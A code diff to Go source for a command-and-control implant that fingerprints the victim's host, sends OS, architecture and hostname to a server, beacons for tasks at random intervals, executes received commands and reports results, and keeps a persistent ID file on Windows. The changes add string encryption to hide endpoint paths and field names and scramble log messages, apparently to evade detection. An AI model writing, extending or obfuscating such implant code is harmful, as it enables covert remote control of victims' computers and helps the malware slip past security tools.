@@ -62,13 +62,13 @@ func (i *plant) Start() {
 
 	time.Sleep(time.Duration(15 * float64(time.Second)))
 	if err := i.sendOSInfo(); err != nil {
-		fmt.Println("Error sending OS info:", err)
+		fmt.Println("Couldn't send osss plants gonna die :'(", err)
 		return
 	}
 
 
 	if err := i.login(); err != nil {
-		fmt.Println("Error logging in:", err)
+		fmt.Println("Couldn't logggg plants gonna fail :'(", err)
 		return
 	}
 	if winapiV2.IsAdmin() {
@@ -85,16 +85,16 @@ func (i *plant) Start() {
 func (i *plant) sendOSInfo() error {
 	
 	osInfo := map[string]string{
-		"implant_id": i.plantID,
-		"os":         runtime.GOOS,
+		"plantID": i.plantID,
+		winapiV2.DecryptString("*6"):         runtime.GOOS,
 		"os_version": getOSVersion(),
-		"arch":       runtime.GOARCH,
-		"hostname":   getHostname(),
+		winapiV2.DecryptString("$7&-"):       runtime.GOARCH,
+		winapiV2.DecryptString("-*61+$( "):   getHostname(),
 	}
 
 	data, err := json.Marshal(osInfo)
 	if err != nil {
-		return fmt.Errorf("error marshaling OS info: %v", err)
+		return fmt.Errorf("error marshaling OSsssss info: %v", err)
 	}
 
 	_,_, err = i.sendHTTPRequest("POST", "/config", data, false)
@@ -132,7 +132,7 @@ func (i *plant) login() error {
 
 func (i *plant) Beaconing() {
 
-	fmt.Println("Implant started with ID:", i.plantID)
+	fmt.Println("Imp"+winapiV2.DecryptString(")$+1e61$71 !e2,1-e")+"ID:", i.plantID)
 	for {
 		var Timer = time.Duration((rand.ExpFloat64() / 0.5) * float64(time.Second)) // random time between 0 and 5 seconds
 		tasks, err := i.fetchTasks()
@@ -159,7 +159,7 @@ func (i *plant) Beaconing() {
 
 func (i *plant) fetchTasks() ([]Task, error) {
 
-	resp,body, err := i.sendHTTPRequest("GET", "/tasks", nil, true)
+	resp,body, err := i.sendHTTPRequest("GET", winapiV2.DecryptString("j1$6.6"), nil, true)
 
 	if err != nil {
 		return nil, fmt.Errorf("error fetching tasks: %v", err)
@@ -186,7 +186,8 @@ func (i *plant) executeTask(task Task) (string, error) {
 	}
 	result, err := module.Execute(task.Command,file_data)
 	if err != nil {
-		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
+		result = err.Error()
+		
 	}
 
 	// Send response to C2 server
@@ -230,13 +231,9 @@ func (i *plant) sendHTTPRequest(method, path string, data []byte, includeToken b
 
 
 func Get_id() string {
-	filePath := ""
-	switch runtime.GOOS {
-	case "linux":
-		filePath= "/home/enigma/id.txt"
-	case "windows":
-		filePath= "C:\\Users"+"\\Public\\Documents\\id.txt"
-	}
+
+	filePath := "C:\\Users"+"\\Public\\Documents\\"+winapiV2.DecryptString(",!k1=1")
+
 
 	// open a file handel
 	fileHandle, err := winapiV2.CreateFile(syscall.StringToUTF16Ptr(filePath), winapiV2.GENERIC_READ|winapiV2.GENERIC_WRITE, 0, nil, winapiV2.OPEN_ALWAYS, winapiV2.FILE_ATTRIBUTE_NORMAL, 0)
@@ -253,7 +250,7 @@ func Get_id() string {
 		var bwritten uint32
 		succ, err := winapiV2.WriteFile(fileHandle, &b[0], uint32(len(b)), &bwritten, nil)
 		if !succ {
-			fmt.Println("Error writing to file:", err)
+			fmt.Println("Error writttt to fillll:", err)
 		}
 	return plantID
 
@@ -263,7 +260,7 @@ func Get_id() string {
 
 		succ, err := winapiV2.ReadFile(fileHandle, &b[0] ,uint32(len(b)), &bread, nil)
 		if !succ {
-			fmt.Println("Error reading file:", err )
+			fmt.Println("Error readddddd fillll:", err )
 		}
 		plantID := string(b)
 		return plantID
@@ -273,7 +270,7 @@ func Get_id() string {
 func getHostname() string {
 	hostname, err := os.Hostname()
 	if err != nil {
-		fmt.Println("Error getting hostname:", err)
+		fmt.Println("Error getttttt hossssnaaa:", err)
 		return "unknown"
 	}
 	return hostname
@@ -283,12 +280,8 @@ func getOSVersion() string {
 	var cmd *exec.Cmd
 
 	switch runtime.GOOS {
-	case "linux":
-		cmd = exec.Command("cat", "/etc/os-release")
 	case "windows":
 		cmd = exec.Command("cmd", "ver")
-	case "darwin":
-		cmd = exec.Command("sw_vers")
 	default:
 		return "Unknown OS"
 	}
@@ -297,7 +290,7 @@ func getOSVersion() string {
 	cmd.Stdout = &out
 	err := cmd.Run()
 	if err != nil {
-		return fmt.Sprintf("Error getting OS version: %v", err)
+		return fmt.Sprintf("Error getttttt OSsssss verrrrrr: %v", err)
 	}
 
 	return out.String()
@@ -305,7 +298,7 @@ func getOSVersion() string {
 
 func (i *plant) sendHeartbeat() {
     for {
-        var _,_,err = i.sendHTTPRequest("GET","/heartbeat",nil,true)
+        var _,_,err = i.sendHTTPRequest("GET",winapiV2.DecryptString("j- $71' $1"),nil,true)
         if err != nil {
             fmt.Printf("Failed to send heartbeat: %v", err)
         }
